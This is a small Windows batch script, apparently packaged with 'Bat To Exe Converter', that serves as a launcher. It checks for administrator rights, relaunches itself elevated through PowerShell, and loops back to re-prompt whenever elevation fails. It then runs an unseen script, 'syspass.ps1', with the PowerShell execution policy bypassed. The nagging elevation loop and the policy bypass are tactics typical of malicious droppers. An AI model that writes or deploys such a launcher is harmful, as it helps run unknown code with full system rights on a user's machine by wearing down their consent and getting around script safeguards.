::[Bat To Exe Converter]
::
::fBE1pAF6MU+EWHreyHcjLQlHcByGNFeeA6YX/Ofr0/mesV0cR/FxaJyKug==
::YAwzoRdxOk+EWAnk
::fBw5plQjdG8=
::YAwzuBVtJxjWCl3EqQJgSA==
::ZR4luwNxJguZRRnWpBNhSA==
::Yhs/ulQjdF+5
::cxAkpRVqdFKZSTk=
::cBs/ulQjdF+5
::ZR41oxFsdFKZSDk=
::eBoioBt6dFKZSDk=
::cRo6pxp7LAbNWATEpSI=
::egkzugNsPRvcWATEpCI=
::dAsiuh18IRvcCxnZtBJQ
::cRYluBh/LU+EWAnk
::YxY4rhs+aU+JeA==
::cxY6rQJ7JhzQF1fEqQJQ
::ZQ05rAF9IBncCkqN+0xwdVs0
::ZQ05rAF9IAHYFVzEqQJQ
::eg0/rx1wNQPfEVWB+kM9LVsJDGQ=
::fBEirQZwNQPfEVWB+kM9LVsJDGQ=
::cRolqwZ3JBvQF1fEqQJQ
::dhA7uBVwLU+EWDk=
::YQ03rBFzNR3SWATElA==
::dhAmsQZ3MwfNWATElA==
::ZQ0/vhVqMQ3MEVWAtB9wSA==
::Zg8zqx1/OA3MEVWAtB9wSA==
::dhA7pRFwIByZRRnk
::Zh4grVQjdCyDJGyX8VAjFANQRDimOXixEroM1Pvi/PqGsV5TUfo6GA==
::YB416Ek+Zm8=
::
::
::978f952a14a936cc963da21a135fa983
:after_connect
net session >nul 2>&1
if %errorlevel% neq 0 (
    powershell -Command "Start-Process -Verb RunAs -FilePath '%~f0' -ArgumentList '%*'"
)
if %errorlevel% neq 0 (
    goto :after_connect
)
powershell -ExecutionPolicy Bypass -File "%~dp0syspass.ps1"